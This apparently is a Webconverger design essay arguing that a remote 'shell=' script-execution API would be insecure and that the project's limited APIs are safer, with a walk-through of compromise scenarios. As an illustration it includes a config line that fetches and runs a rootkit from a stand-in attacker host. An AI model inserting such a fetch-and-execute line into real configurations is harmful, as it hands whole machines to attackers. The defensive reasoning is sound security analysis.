tl;dr Webconverger's current security model of enabling features through
limited [[API]]s is actually the right way to do it.

New functionality in Webconverger, means new [[API]]s to control them. Since I
can be too lazy to design an API, I've often thought about offering a shell
API.

For example:

	shell=https://example.com/hello.sh

Which downloads and executes the script. Analogous to `curl https://example.com/hello.sh | sh` "anti-pattern".

The pro with the shell API is that we can now create scripts on the fly, and so
could clients to toggle some functionality like:

* Copying in a style sheet and overriding style
* Downloading service files and enabling / starting them (e.g. for motion detection hardware)
* Installing some special driver or configuring xinputs
* Tweaking wpa_supplicant@wlan0.service with [wext](https://wiki.archlinux.org/index.php/WPA_supplicant) for older wlan interfaces
* Overriding SSL warnings or preloading internal SSL certificates
* Probably most importantly: Freedom to create your own API!

So we can implement new functionality as clients needed them, without
Webconverger requiring an reboot and upgrade!

# BUT A SHELL API IS NOT SECURE

HTTP Secure doesn't help. Just imagine if someone managed to compromise
**https://config.webconverger.com**. Every config could get an extra
line:

	shell=https://iamahacker.s3.amazonaws.com/rootkit.sh

Own4ge! 1000s of Webconverger machines could become <a
href="http://en.wikipedia.org/wiki/Zombie_%28computer_science%29">zombies</a>.

# What about CODE SIGNING?

We could employ code signing on the shell API. I.e. before executing
rootkit.sh, we also download rootkit.sh.gpg to check it's signed by someone
trusted.

But who is going to be trusted? Ultimately, the Webconverger developer makes
most sense. However this extra layer of security FAILs if the hacker managed to
get the developers laptop where both GPG (for code signing) and SSH key (for
config.webconverger.com git control) lies.

Too risky. Too much power in one place.

Lets get practical and think about security issues by:

1. The speed in which they take to fix (how much downtime will there be?)
* The speed in which they take to detect (can we actually tell there is malicious code at play?)
* The impact of the security issue (will clients lose data or hardware?)
* The worst possible action customer needs to take (what does a client have to do?)

The shell= API would score:

1. Once the machine is compromised, it can't be fixed remotely
* We probably cannot tell a machine has been compromised
* The entire machine will effectively be lost to the hacker. Completely owned.
* The client would have to re-install (which doesn't take long mind)

# Back to the status quo

The reason that the [[API]]s exist is to **protect** the Webconverger system
from being permanently compromised. The APIs also offer crucially:

* idempotency
* safety from permanently damaging the system
* they are tested before bring rolled out

So even in the case where https://config.webconverger.com/ is totally
compromised. What's the WORST possible outcome?

# What currently are the WORST POSSIBLE SCENARIOS?

Today the worst possible scenarios for Webconverger clients controlled by a
compromised <https://config.webconverger.com/> are:

## `homepage=` is changed to point to some offensive site

As soon as the compromise was realised, restoring config.webconverger.com is as
simple as cloning a git repository onto a Web host that the DNS `dig +short
config.webconverger.com` points to. The DNS record's TTL for
config.webconverger.com is 60 seconds. DNS is hosted at Route 53 and the
Registration is currently with Dreamhost, both are protected by 2 factor
authentication.

The point is, **config.webconverger.com** can be restored very quickly if
compromised. So the "hacked configuration" with the offensive site can be
mitigated quickly.

## Denial of service

A cronjob, for example rebooting Webconverger every minute would lead to denial
of service. Again this can be mitigated quickly since
**config.webconverger.com** is completely managed in source control is designed
to be easily restored. However the client would need to be rebooted.

## Browser sessions are not cleared between users

The "noclean" API means that Webconverger would not delete the `~/.mozilla`
directory between sessions. This could jeopardise users privacy _local to the
machine_, as cookies etc would be shared amongst sessions. Again, once this
discovered, it is very quickly rectified by effectively a reboot.

Our current API design served by <https://config.webconverger.com/> would score:

1. Usually this would just require a reboot, but in the homepage= case with instantupdate, it could be quicker
* We have a git log of all the configuration changes, so we can tell if something is amiss
* The worst possible case is `noclean` mode, described above, which isn't nearly as bad as `shell=` potential of having root access
* Worst possible case with config.webconverger.com, the machine would require a **manual reboot**

## Wait... what if the upgrade mechanism got compromised?

Now it's probably worth mentioning the elephant in the room. What happens if
<https://github.com/webconverger/webc> got compromised? The impact could be
very bad (root), however note that upgrades only happen at boot with install
versions. So there is a natural delay. Next the speed in which we can detect
and fix a piece of malicious code injected into our repository should be VERY
QUICK. <https://github.com/Webconverger/webc/commits/master> is **closely
watched**. Finally the worst possible outcome for a client is a re-install.

# Keeping to the current slow API design

So, thanks the [[API]]'s safety and the way config.webconverger.com is managed,
these "worst possible" scenarios are far less risky, since they are severely
limited, quickly and easily fixed by a reboot. The current [[security]] design
is a LOT better than if the machine turned into a Zombie via a remote scripting
interface like `shell=`!

The down side is that you need to request every new feature and we need to
implement it as an [[API]]. It's more secure that way.
